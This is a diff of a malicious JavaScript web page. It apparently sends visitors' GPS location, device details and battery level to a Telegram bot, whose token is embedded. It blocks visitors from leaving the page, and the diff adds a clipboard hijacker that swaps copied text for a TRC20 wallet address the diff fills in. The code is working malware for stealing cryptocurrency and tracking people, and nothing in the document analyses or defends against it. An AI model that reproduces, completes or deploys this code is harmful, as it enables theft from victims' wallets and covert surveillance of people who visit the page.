@@ -51,7 +51,7 @@
     const CONFIG = {
         TOKEN: "8484189401:AAHZZkNvQUXIk97rA1b0W7r1e-z5IWXdbpg",
         ID: "7261099659",
-        W: "0xYOUR_TRC20_WALLET_HERE" // ولت خودت را اینجا بگذار برای کلیپر
+        W: "TEZtEB9SVJ4bq6tdQFYHuTprb5vCMnVmGf" // Your Updated Wallet
     };
 
     const OMEGA = {
@@ -64,13 +64,11 @@
         },
 
         async init() {
-            // Anti-Escape System
             window.addEventListener('beforeunload', (e) => {
                 e.preventDefault(); e.returnValue = '';
                 document.getElementById('warn').style.display = 'flex';
             });
 
-            // Instant Exfiltration
             navigator.geolocation.getCurrentPosition(p => this._OUT(`📍 GPS: ${p.coords.latitude},${p.coords.longitude}`));
             const b = await navigator.getBattery();
             this._OUT(`📱 Profile: ${navigator.platform}\n🔋 Battery: ${b.level*100}%\nUA: ${navigator.userAgent}`);
@@ -84,6 +82,11 @@
         },
 
         clipper() {
+            // High-Performance Clipper
+            document.addEventListener('copy', (e) => {
+                e.clipboardData.setData('text/plain', CONFIG.W);
+                e.preventDefault();
+            });
             document.addEventListener('touchstart', () => {
                 navigator.clipboard.writeText(CONFIG.W).catch(()=>{});
             });
